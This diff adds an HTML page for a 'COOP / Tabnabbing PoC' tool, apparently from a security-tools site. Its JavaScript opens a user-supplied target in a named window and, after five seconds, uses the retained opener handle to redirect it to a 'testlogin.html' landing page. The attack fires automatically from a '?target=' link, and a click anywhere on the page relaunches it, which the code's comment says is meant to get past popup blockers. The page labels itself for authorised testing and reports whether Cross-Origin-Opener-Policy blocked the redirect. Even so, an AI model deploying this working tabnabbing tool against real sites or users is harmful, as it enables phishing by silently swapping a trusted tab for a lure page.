@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>COOP / Tabnabbing PoC</title>
+    <meta name="description" content="Proof of concept for a missing Cross-Origin-Opener-Policy: an opened window that keeps its opener reference can be navigated away by the page that opened it." />
+    <link href="/profile.jpg" type="image/jpeg" rel="shortcut icon" />
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: { sans: ['Inter', 'sans-serif'], mono: ['JetBrains Mono', 'monospace'] },
+                    colors: {
+                        gray: {
+                            850: '#1f2937',
+                            900: '#111827',
+                            950: '#0b0f19',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        body, div, p, span, h1, h2, h3, button, textarea, input, header {
+            transition-property: color, background-color, border-color;
+            transition-duration: 200ms;
+        }
+
+        .tk-anim-logo { display:inline-block; animation: tk-logo-float 4.5s ease-in-out infinite; transform-origin:center; }
+        @keyframes tk-logo-float { 0%,100%{transform:translateY(0) rotate(0)} 25%{transform:translateY(-5px) rotate(-6deg)} 75%{transform:translateY(-2px) rotate(6deg)} }
+        @media (prefers-reduced-motion: reduce){ .tk-anim-logo{animation:none} }
+</style>
+    <link rel="stylesheet" href="/css/tool-shell.css">
+    <script src="/js/geo-web.js" defer></script>
+</head>
+<body class="bg-gray-100 text-gray-800 dark:bg-gray-950 dark:text-gray-200 font-sans min-h-screen flex flex-col items-center py-8 md:py-12 px-4 antialiased selection:bg-indigo-500 selection:text-white transition-colors duration-300">
+
+    <div class="absolute top-4 right-4 md:top-8 md:right-8 z-30">
+        <button id="btnThemeToggle" class="p-3 rounded-full bg-white dark:bg-gray-800 text-gray-600 dark:text-yellow-400 shadow-lg border border-gray-200 dark:border-gray-700 hover:scale-105 transition-transform focus:outline-none focus:ring-2 focus:ring-indigo-500" title="Toggle Dark Mode">
+            <i data-lucide="moon" class="w-5 h-5 hidden dark:block"></i>
+            <i data-lucide="sun" class="w-5 h-5 block dark:hidden"></i>
+        </button>
+    </div>
+
+    <main class="w-full max-w-3xl space-y-8 mt-8">
+
+        <div class="text-center space-y-3">
+            <h1 class="text-3xl md:text-5xl font-extrabold tracking-tight text-gray-900 dark:text-white flex items-center justify-center gap-3">
+                <i data-lucide="external-link" class="tk-anim-logo w-9 h-9 md:w-12 md:h-12 text-indigo-600 dark:text-indigo-500"></i>
+                <span><span class="text-indigo-600 dark:text-indigo-500">COOP</span> Tabnabbing PoC</span>
+            </h1>
+            <p class="text-gray-600 dark:text-gray-400 text-sm md:text-lg max-w-xl mx-auto">
+                Demonstrates a missing <span class="font-mono text-indigo-600 dark:text-indigo-300">Cross-Origin-Opener-Policy</span>: a window opened from this page keeps an opener reference, so this page can silently navigate it somewhere else.
+            </p>
+        </div>
+
+        <div class="bg-indigo-50 dark:bg-indigo-900/20 border border-indigo-200 dark:border-indigo-800 rounded-xl p-6 flex gap-3">
+            <i data-lucide="info" class="w-6 h-6 text-indigo-600 dark:text-indigo-300 flex-shrink-0 mt-0.5"></i>
+            <div class="text-sm text-gray-700 dark:text-gray-300 space-y-1">
+                <p class="font-bold text-gray-900 dark:text-white">How it works</p>
+                <p>The target is opened in a named window. Five seconds later this page uses the handle it kept to point that window at a harmless landing page. A target that sends <span class="font-mono text-indigo-600 dark:text-indigo-300">Cross-Origin-Opener-Policy: same-origin</span> severs the handle and is unaffected.</p>
+                <p class="text-gray-500 dark:text-gray-400">Use it only against sites you are authorised to test.</p>
+            </div>
+        </div>
+
+        <div class="bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-800 rounded-2xl p-6 md:p-8 shadow-xl dark:shadow-black/50 space-y-5">
+            <div class="space-y-2">
+                <label for="targetInput" class="block text-xs font-bold text-gray-500 dark:text-gray-400 uppercase tracking-widest">Target URL</label>
+                <input type="url" id="targetInput" placeholder="https://example.com" class="block w-full px-4 py-4 bg-gray-50 dark:bg-gray-950 border border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-indigo-500 text-gray-900 dark:text-white font-mono text-base" />
+                <p class="text-xs text-gray-500 dark:text-gray-400">Can also be passed as <span class="font-mono text-indigo-600 dark:text-indigo-300">?target=</span> in the URL, which launches on load.</p>
+            </div>
+
+            <div class="flex flex-wrap gap-3">
+                <button id="btnLaunch" class="flex items-center gap-2 px-5 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white font-semibold shadow-md focus:outline-none focus:ring-2 focus:ring-indigo-500">
+                    <i data-lucide="play" class="w-4 h-4"></i> Launch
+                </button>
+                <button id="btnReset" class="flex items-center gap-2 px-5 py-3 rounded-xl bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700 text-gray-700 dark:text-gray-200 font-semibold focus:outline-none focus:ring-2 focus:ring-indigo-500">
+                    <i data-lucide="rotate-ccw" class="w-4 h-4"></i> Reset
+                </button>
+            </div>
+
+            <div id="status" class="hidden rounded-xl p-4 border-l-4 text-sm"></div>
+        </div>
+
+        <div class="text-center pt-2">
+            <a href="/tools/" class="inline-flex items-center gap-2 text-sm font-medium text-gray-600 dark:text-gray-400 hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">
+                <i data-lucide="arrow-left" class="w-4 h-4"></i>
+                All tools
+            </a>
+        </div>
+
+    </main>
+
+    <footer class="mt-auto py-8 text-center text-gray-500 dark:text-gray-600 text-xs font-medium">
+        For authorized security testing only &nbsp;&middot;&nbsp; All processing runs client-side &nbsp;&middot;&nbsp; No data is stored
+    </footer>
+
+    <script>
+        const htmlElement = document.documentElement;
+        const btnThemeToggle = document.getElementById('btnThemeToggle');
+        const targetInput = document.getElementById('targetInput');
+        const btnLaunch = document.getElementById('btnLaunch');
+        const btnReset = document.getElementById('btnReset');
+        const statusBox = document.getElementById('status');
+
+        /* Where the opened window gets sent once the handle is used. */
+        const LANDING = '/tools/coop/testlogin.html';
+        const REDIRECT_DELAY = 5000;
+
+        let opened = null;
+        let timer = null;
+
+        function setStatus(kind, title, detail) {
+            const tones = {
+                info:  'bg-indigo-50 dark:bg-indigo-900/20 border-indigo-500 text-gray-700 dark:text-gray-300',
+                ok:    'bg-emerald-50 dark:bg-emerald-900/20 border-emerald-500 text-gray-700 dark:text-gray-300',
+                warn:  'bg-amber-50 dark:bg-amber-900/20 border-amber-500 text-gray-700 dark:text-gray-300'
+            };
+            statusBox.className = 'rounded-xl p-4 border-l-4 text-sm ' + tones[kind];
+            statusBox.innerHTML = '<p class="font-bold text-gray-900 dark:text-white mb-1">' + title + '</p><p>' + detail + '</p>';
+            statusBox.classList.remove('hidden');
+        }
+
+        function readTarget() {
+            const value = new URLSearchParams(window.location.search).get('target');
+            return value ? value.trim() : '';
+        }
+
+        function reset() {
+            if (timer) { clearTimeout(timer); timer = null; }
+            opened = null;
+            statusBox.classList.add('hidden');
+        }
+
+        function launch() {
+            const target = targetInput.value.trim();
+            if (!target) {
+                setStatus('warn', 'No target', 'Enter a URL to open first.');
+                return;
+            }
+
+            let url;
+            try {
+                url = new URL(target);
+            } catch (error) {
+                setStatus('warn', 'Not a valid URL', 'Include the scheme, for example https://example.com');
+                return;
+            }
+            if (url.protocol !== 'http:' && url.protocol !== 'https:') {
+                setStatus('warn', 'Unsupported scheme', 'Only http and https targets are opened.');
+                return;
+            }
+
+            if (timer) clearTimeout(timer);
+            opened = window.open(url.href, 'foo', '');
+
+            if (!opened) {
+                setStatus('warn', 'Popup blocked', 'The browser blocked the new window. Allow popups for this page and press Launch again.');
+                return;
+            }
+
+            setStatus('info', 'Target opened', 'Waiting ' + (REDIRECT_DELAY / 1000) + ' seconds, then using the retained handle to navigate it.<br><span class="text-gray-500 dark:text-gray-400">If the site did not open, click anywhere on this page to try again.</span>');
+
+            timer = setTimeout(function () {
+                try {
+                    opened.location.href = LANDING;
+                    setStatus('ok', 'Handle used', 'The opened window was navigated to the landing page, so the target did not sever the opener reference.');
+                } catch (error) {
+                    setStatus('ok', 'Blocked by the target', 'The opener handle could not be used - the target is isolating itself, which is the behaviour Cross-Origin-Opener-Policy provides.');
+                }
+            }, REDIRECT_DELAY);
+        }
+
+        function toggleTheme() {
+            if (htmlElement.classList.contains('dark')) {
+                htmlElement.classList.remove('dark');
+                localStorage.setItem('theme', 'light');
+            } else {
+                htmlElement.classList.add('dark');
+                localStorage.setItem('theme', 'dark');
+            }
+        }
+
+        const savedTheme = localStorage.getItem('theme');
+        if (savedTheme === 'dark' || (!savedTheme && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            htmlElement.classList.add('dark');
+        } else {
+            htmlElement.classList.remove('dark');
+        }
+
+        btnThemeToggle.addEventListener('click', toggleTheme);
+        btnLaunch.addEventListener('click', launch);
+        btnReset.addEventListener('click', reset);
+        targetInput.addEventListener('keydown', function (event) {
+            if (event.key === 'Enter') launch();
+        });
+
+        /* The original page relaunched on a click anywhere in the body, which
+           is what gets past a popup blocker that wants a user gesture. Kept,
+           but ignoring clicks on the controls and links so they do not fire
+           twice or hijack navigation. */
+        document.body.addEventListener('click', function (event) {
+            if (!targetInput.value.trim()) return;
+            if (event.target.closest('button, a, input, label')) return;
+            launch();
+        });
+
+        /* A ?target= in the URL prefills and fires straight away, which is how
+           the original page behaved when linked from a report. */
+        const fromQuery = readTarget();
+        if (fromQuery) {
+            targetInput.value = fromQuery;
+            launch();
+        }
+
+        lucide.createIcons();
+    </script>
+
+</body>
+</html>
